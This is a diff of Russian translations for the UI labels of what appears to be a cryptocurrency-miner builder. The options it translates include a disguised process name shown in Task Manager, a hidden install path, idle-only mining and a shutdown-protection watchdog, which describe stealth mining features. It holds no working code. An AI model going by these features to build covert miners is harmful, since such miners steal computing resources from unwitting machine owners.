@@ -2,7 +2,7 @@
 167  Me.TooltipHelper.SetToolTip(Me.helpLabelPool, "The pool.... -- Пул для майнинга (Пример: xmr.examplepool.com:8080)
 180 Me.TooltipHelper.SetToolTip(Me.Label32, "The Installed miners..... -- Имя майнера для "Диспетчера задач" и подобных программ
 194 Me.TooltipHelper.SetToolTip(Me.Label31, "The location... -- Место для сохранения установленного майнера
-207 Me.TooltipHelper.SetToolTip(Me.Label35, "The ass.... -- Инфа о созданном файле, еще эта инфа будет отображаться в диспетчере задач 
+207 Me.TooltipHelper.SetToolTip(Me.Label35, "The ass.... -- Информация о созданном файле, еще эта информация будет отображаться в диспетчере задач 
 234 Me.TooltipHelper.SetToolTip(Me.Label25, "The amount of... -- Время до перехода в 'idle' режим
 247 Me.TooltipHelper.SetToolTip(Me.Label21, "The amount of CPU the.... -- Процент использования ресурсов процессора во время простоя компьютера
 260 Me.TooltipHelper.SetToolTip(Me.Label17, "SSL/TLS increases perfo... -- Протокол SSL/TLS повышает стабильность но используется не на всех пулах. Обязательно посмотри поддерживается ли он на твоем пуле, если он тебе нужен, конечно
@@ -18,7 +18,7 @@
 539 Me.Label6.Text = "Wallet Address/User:" -- Кошелёк Адрес/Пользователь:
 549 Me.Label7.Text = "Password (if required):" -- Пароль (если необходимо)
 584 Me.TabPage2.Text = "Install" -- Установка
-595 Me.Label37.Text = "Watchdog:" -- Скрыть файл
+595 Me.Label37.Text = "Watchdog:" -- Защита от выключения
 607 Me.toggleWatchdog.Text = "Enable GPU Mining" -- Вкл GPU майнинг
 621 Me.chkInstall.Text = "Disabled" -- Выкл
 648 Me.Label2.Text = "Save Path:" -- Путь распаковки
